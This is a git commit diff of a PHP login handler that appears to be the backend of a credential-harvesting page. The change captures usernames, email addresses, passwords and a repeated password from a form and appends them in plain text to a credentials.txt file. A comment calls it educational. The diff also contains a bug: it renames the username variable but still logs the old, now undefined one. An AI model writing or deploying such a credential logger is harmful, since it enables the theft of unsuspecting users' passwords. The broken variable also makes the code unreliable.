ceab54306705231ba69fb0014107f14cf92cd953
xriser200 <epajazitj@gmail.com>
2024-07-17 21:34:15 +0200

    Update login.php

--- login.php
+++ login.php
@@ -1,11 +1,13 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     // Capture the credentials from the POST request
-    $username = htmlspecialchars($_POST['username']);
+    $user = htmlspecialchars($_POST['user']);
+    $mail = htmlspecialchars($_POST['mail']);
     $password = htmlspecialchars($_POST['password']);
+    $rptpassword = htmlspecialchars($_POST['rptpassword']);
     
     // Log the credentials (for educational purposes only, do not log plain text passwords in real applications)
-    $log_entry = "Username: $username, Password: $password" . PHP_EOL;
+    $log_entry = "Username: $username,Email: $mail ,Password: $password,Second Password: $rptpassword" . PHP_EOL;
     file_put_contents('credentials.txt', $log_entry, FILE_APPEND);
     
     // Display a simple response
